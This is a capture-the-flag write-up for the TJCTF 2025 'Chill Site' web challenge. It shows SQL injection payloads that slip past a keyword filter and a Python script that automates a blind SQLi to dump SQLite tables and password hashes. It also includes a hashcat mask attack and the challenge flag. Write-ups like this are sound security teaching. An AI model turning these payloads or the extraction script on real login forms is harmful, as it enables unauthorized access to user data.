---
title: "[TJCTF 2025] - Chill Site"
date: 2025-06-08
author: me
categories: [writeups]
tags: ["Web","SQLi", "Blind SQLi", "Hashcat", "TJCTF"]
---

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
<link rel="stylesheet" href="/assets/css/lil-bootstrap.css">
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<br>

*I use this site a lot just to chill. I sure am glad that the site handles my passwords in "database" safely as well!*

<br>


_____________________________________________________



<br>

**Table of contents:**

- <a href="#web-app">Web App</a>
- <a href="#authentication-bypass">Authentication Bypass</a>
- <a href="#dumping-database">Dumping Database</a>
- <a href="#cracking-hashs">Cracking hashs</a>
- <a href="#flag">Flag</a>

<br>

_____________________________________________________


<br>

## Web App

The web application is relatively simple, as it consists solely of a login form:

![2](/images/tjctf/chillsite/home.png)

It quickly becomes clear that the first step of the challenge involves exploiting an SQL injection.

## Authentication Bypass

We can start by testing a standard payload such as `' OR 1=1 -- - ` but we get the following error:

![2](/images/tjctf/chillsite/step2.png)

I continued testing various payloads to determine whether certain operators are restricted or blacklisted. The payload `' AND 1=2 -- - ` returns the following error:

![2](/images/tjctf/chillsite/step3.png)

This suggests that the strings `OR` and `--` are being filtered.

From that point on, I tested numerous payloads under the assumption that a field named `username`, `login` or `user` existed, and I managed to bypass the authentication using the following payload:<br>`' || user <> '' /*`.

This results in a query similar to:

```sql
SELECT user FROM <table_name> WHERE user = '' || user <> '' /* '
```

Since there is at least one user whose `user` field is not empty, the query evaluates to `True`, allowing us to bypass authentication and obtain the following result:

![2](/images/tjctf/chillsite/step4.png)

```
Username: You, Password (hashed): 6b5f8e745378e0fc64ce20dc041974b05bf5c1cc, 500 hours passed on this site.

Username: test, Password (hashed): 9a23b6d49aa244b7b0db52949c0932c365ec8191, 0 hours passed on this site.

Username: tuxtheflagmasteronlylikeslowercaseletters, Password (hashed): 64b7c90a991571c107cc663aa768514822896f49, 20 hours passed on this site.

Username: humanA, Password (hashed): 9aa888e9ad7f219a13348362b4df4e41da33cb48, 2147483647 hours passed on this site.
```

Here, we notice the presence of the user `tuxtheflagmasteronlylikeslowercaseletters`, who appears to be of interest. I therefore attempted to crack his password using several dictionaries, such as rockyou, but none of them yielded the plaintext value.

I also bypassed authentication by forcing the use of specific usernames, like using 
`tuxtheflagmasteronlylikeslowercaseletters' /*` however, this did not allow me to retrieve the flag.

I then suspected that the flag was stored in another table, so I proceeded with a `Blind SQL injection` to dump the entire database.

> This was entirely unnecessary and a waste of time. Proceed to <a href="#cracking-hashs">Cracking hashs</a> to view the expected next part.
{: .prompt-danger }

## Dumping Database

Blind SQL Injection enables data extraction from the database even when the application does not directly display the results. The technique involves sending queries with true/false conditions and observing differences in the responses (such as a message or the order of results) to infer, character by character, the value of data elements.

In the context of our challenge, this could be achieved by injecting queries that uses a conditional `GROUP BY` with a `CASE WHEN` statement (see <a href="https://sql.sh/cours/case">SQL - CASE</a>).

```
' || pass <> '' GROUP BY (CASE WHEN (SELECT SUBSTR(name, 1, 1) FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 0) = 'a' THEN user ELSE 'randomSh1t' END) /*

```
What we're doing here is forcing the database to group the results either by the `user` column or by a dummy value `randomSh1t`, depending on whether the first character of the name of the first table is equal to `a`.

- If the condition is false, all results will be grouped under `'randomSh1t'`, which breaks the join and results in either a single generic user or a different output.

Example: Testing if first letter of first table name is `a`:

![2](/images/tjctf/chillsite/step5.png)

→ Only one user → Condition is `False` ❌

- If the condition is true, all results will be grouped by `user`, and we’ll see multiple users in the response (sorted according to the usual logic).

Example: Testing if first letter of first table name is `s`:

![2](/images/tjctf/chillsite/step6.png)

→ Multiple users → Condition is `True` ✅

Following this logic, we can automate the process in Python to dump the entire database.

```python
import requests
import string
import re

def dump_table_name(pos, char): # Resulting 'database' and 'stats' 
    return f"' || pass <> '' GROUP BY (CASE WHEN (SELECT SUBSTR(name, {pos}, 1) FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 0) = '{char}' THEN user ELSE 'randomSh1t' END) /*"

def dump_column_name(table_name, pos, char): # Resulting 'user', 'pass' and 'time'
    return f"' || pass <> ''  GROUP BY  (CASE WHEN (SELECT SUBSTR(name, {pos}, 1) FROM pragma_table_info('{table_name}') LIMIT 1 OFFSET 0) = '{char}' THEN user ELSE 'randomSh1t' END) /*"

def dump_value(column_name, pos, char):
    return f"' || pass <> '' GROUP BY (CASE WHEN (SELECT SUBSTR({column_name}, {pos}, 1) FROM stats LIMIT 1 OFFSET 0) = '{char}' THEN user ELSE 'randomSh1t' END) /*"

url = "https://chill-site-8fc6707c0bcab21d.tjc.tf/"
leaked_data = list("")
charset = string.printable

while True:

    found_char = False

    for char in charset:
        pos = len(leaked_data) + 1
        
        payload = dump_table_name(pos, char)

        data = {
            "username": payload,
            "password": "test"
        }

        response = requests.post(url, data=data, allow_redirects=True)

        usernames = re.findall(r"Username: ([\w\d]+)", response.text)

        if len(usernames) > 1:
            found_char = True
            leaked_data.append(char)
            print("[+] ", ''.join(leaked_data))
            break

    if not found_char:
        break
```

### Table names

`LIMIT 1 OFFSET 0`

```text
$ python blind_sqli.py
[+] s
[+] st
[+] sta
[+] stat
[+] stats
```
`LIMIT 1 OFFSET 1`
```text
$ python blind_sqli.py
[+] d
[+] da
[+] dat
[+] data
[+] datab
[+] databa
[+] databas
[+] database
```

### Column names for stats table

`LIMIT 1 OFFSET 0`
```text
$ python blind_sqli.py
[+] u
[+] us
[+] use
[+] user
```
`LIMIT 1 OFFSET 1`
```text
$ python blind_sqli.py
[+] p
[+] pa
[+] pas
[+] pass
```
`LIMIT 1 OFFSET 2`
```text
$ python blind_sqli.py
[+] t
[+] ti
[+] tim
[+] time
```  
We finally get the entire `stats` table:  

| user                                       | pass                                          | time        |
|-------------------------------------------|-----------------------------------------------|-------------|
| You                                        | 6b5f8e745378e0fc64ce20dc041974b05bf5c1cc      | 500         |
| test                                       | 9a23b6d49aa244b7b0db52949c0932c365ec8191      | 0           |
| tuxtheflagmasteronlylikeslowercaseletters | 64b7c90a991571c107cc663aa768514822896f49      | 20          |
| humanA                                     | 9aa888e9ad7f219a13348362b4df4e41da33cb48      | 2147483647  |

I obviously didn't find any other interesting tables that might contain the flag, so I concluded that this was not the intended way. I therefore shifted my focus to the hashes I had obtained.

## Cracking Hashs

The interesting user is therefore `tuxtheflagmasteronlylikeslowercaseletters`. As the username suggests, the corresponding plaintext password likely contains only lowercase letters.

We can try cracking it with hashcat:

```text
teiiko@kali:~$ hashcat -m 100 -a 3 64b7c90a991571c107cc663aa768514822896f49 ?l?l?l?l?l?l?l
```

![2](/images/tjctf/chillsite/hashcat.png)

`tuxtheflagmasteronlylikeslowercaseletters:allsgud`

## Flag

By logging in with the previously obtained credentials, we are able to retrieve the flag:

![2](/images/tjctf/chillsite/flag.png)

> 🚩 `tjctf{3verth1ng_i5_fin3}`

A lot of time was spent unnecessarily, but it was still an interesting challenge to work on!